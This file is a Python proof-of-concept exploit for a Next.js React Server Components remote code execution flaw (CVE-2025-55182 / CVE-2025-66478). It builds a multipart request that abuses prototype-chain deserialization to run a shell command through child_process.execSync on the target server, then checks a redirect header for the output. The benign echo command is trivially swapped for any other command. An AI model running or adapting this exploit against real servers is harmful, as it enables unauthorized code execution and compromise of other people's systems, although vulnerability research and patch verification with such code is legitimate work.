#!/usr/bin/env python3
"""
Minimal PoC for CVE-2025-55182 / CVE-2025-66478
Next.js React Server Components RCE

Usage: python poc.py <target_url>
"""

import sys
import re
import requests
from urllib.parse import urlparse


def resolve_redirect(url: str, timeout: int = 10) -> str:
    """Follow redirects to find the actual endpoint (same host only)."""
    original_host = urlparse(url).netloc
    current_url = url
    
    for _ in range(10):  # Max 10 redirects
        try:
            resp = requests.head(
                current_url,
                timeout=timeout,
                verify=False,
                allow_redirects=False
            )
            if resp.status_code in (301, 302, 303, 307, 308):
                location = resp.headers.get("Location", "")
                if location:
                    if location.startswith("/"):
                        # Relative redirect
                        parsed = urlparse(current_url)
                        current_url = f"{parsed.scheme}://{parsed.netloc}{location}"
                    else:
                        # Absolute redirect - check if same host
                        new_host = urlparse(location).netloc
                        if new_host == original_host:
                            current_url = location
                        else:
                            break
                else:
                    break
            else:
                break
        except requests.exceptions.RequestException:
            break
    
    return current_url


def send_exploit(url: str, headers: dict, body: str) -> requests.Response | None:
    """Send the exploit payload to a URL."""
    try:
        return requests.post(
            url,
            headers=headers,
            data=body,
            timeout=10,
            verify=False,
            allow_redirects=False
        )
    except requests.exceptions.RequestException as e:
        print(f"[!] Error: {e}")
        return None


def check_vulnerable(resp: requests.Response) -> bool:
    """Check if response indicates successful RCE."""
    redirect_header = resp.headers.get("X-Action-Redirect", "")
    return bool(re.search(r".*/login\?a=1337.*", redirect_header))


def print_response(resp: requests.Response):
    """Print response details."""
    print(f"[*] Status: {resp.status_code}")
    print(f"\n[*] Response Headers:")
    for header, value in resp.headers.items():
        print(f"    {header}: {value}")
    print(f"\n[*] Response Body:")
    print(resp.text)
    print()


def exploit(target: str) -> bool:
    """Send RCE payload to target and check for successful execution."""
    
    cmd = "echo $((1330+7))"
    
    # Payload that exploits RSC deserialization to execute arbitrary code
    prefix_payload = (
        f"var res=process.mainModule.require('child_process').execSync('{cmd}')"
        f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
    )

    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B9999\\"}","_response":{"_prefix":"'
        + prefix_payload
        + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )

    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    
    body = (
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    )

    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Next-Action": "x",
    }

    root_url = target.rstrip("/") + "/"
    
    print(f"[*] Targeting: {root_url}")
    print(f"[*] Payload command: {cmd}")
    
    # First, try the root URL
    resp = send_exploit(root_url, headers, body)
    if resp is None:
        return False
    
    print_response(resp)
    
    if check_vulnerable(resp):
        redirect_header = resp.headers.get("X-Action-Redirect", "")
        print(f"[+] VULNERABLE! RCE confirmed.")
        print(f"[+] X-Action-Redirect: {redirect_header}")
        return True
    
    # Root not vulnerable - try following redirects
    print(f"[*] Root path not vulnerable, checking redirect path...")
    redirect_url = resolve_redirect(root_url)
    
    if redirect_url != root_url:
        print(f"[*] Following redirect to: {redirect_url}")
        resp = send_exploit(redirect_url, headers, body)
        if resp is None:
            return False
        
        print_response(resp)
        
        if check_vulnerable(resp):
            redirect_header = resp.headers.get("X-Action-Redirect", "")
            print(f"[+] VULNERABLE! RCE confirmed.")
            print(f"[+] X-Action-Redirect: {redirect_header}")
            return True
    
    print(f"[-] Not vulnerable or patched.")
    redirect_header = resp.headers.get("X-Action-Redirect", "")
    if redirect_header:
        print(f"[-] X-Action-Redirect: {redirect_header}")
    return False


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        print(f"Example: {sys.argv[0]} http://localhost:3000")
        sys.exit(1)
    
    requests.packages.urllib3.disable_warnings()
    
    vulnerable = exploit(sys.argv[1])
    sys.exit(0 if vulnerable else 1)

